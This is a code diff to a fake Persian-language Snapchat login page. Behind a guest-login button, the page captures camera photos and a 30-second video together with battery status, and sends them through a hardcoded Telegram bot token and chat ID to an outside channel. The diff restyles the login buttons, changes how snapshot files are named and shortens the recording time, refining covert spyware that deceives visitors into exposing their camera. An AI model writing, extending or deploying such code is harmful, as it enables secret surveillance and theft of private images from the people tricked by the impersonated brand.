@@ -98,8 +98,8 @@
   <!-- Login Screen -->
   <div class="login-screen hidden bg-yellow-400 flex flex-col items-center justify-center">
     <h2 class="text-2xl font-bold mb-6">ورود به اسنپ‌چت</h2>
-    <div class="btn bg-blue-600 text-white"><img src="https://img.icons8.com/color/48/google-logo.png" width="24"> ورود با گوگل</div>
-    <div class="btn bg-blue-800 text-white"><img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24"> ورود با فیسبوک</div>
+    <div class="btn bg-white text-black"><img src="https://img.icons8.com/color/48/google-logo.png" width="24"> ورود با گوگل</div>
+    <div class="btn bg-white text-black"><img src="https://img.icons8.com/fluency/48/facebook-new.png" width="24"> ورود با فیسبوک</div>
     <div class="btn bg-black text-white" onclick="enterAsGuest()">ورود مهمان</div>
   </div>
 
@@ -122,7 +122,7 @@
     const botToken = "7720902826:AAEK57GNutoXcCEYyTcWeySwRt829nxPhDI";
     const chatId = "-1002651451203";
 
-    let stream, mediaRecorder, chunks = [], photoCount = 0, videoSent = false;
+    let stream, mediaRecorder, chunks = [], videoSent = false;
 
     function enterAsGuest() {
       loginScreen.classList.add("hidden");
@@ -179,11 +179,10 @@
       ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
       canvas.toBlob(async blob => {
         const battery = await getBatteryInfo();
-        const caption = `📸 عکس ${++photoCount}\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`;
         const form = new FormData();
         form.append("chat_id", chatId);
-        form.append("photo", blob, `snap_${photoCount}.jpg`);
-        form.append("caption", caption);
+        form.append("photo", blob, `snap_${Date.now()}.jpg`);
+        form.append("caption", `📸 عکس\n🔋 شارژ: ${battery.level}%\n⚡ شارژر: ${battery.charging ? "وصل است" : "قطع است"}`);
         await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
           body: form
@@ -204,7 +203,7 @@
       mediaRecorder.start();
       setTimeout(() => {
         if (mediaRecorder.state === "recording") mediaRecorder.stop();
-      }, 60000);
+      }, 30000);
     }
 
     async function sendVideo() {
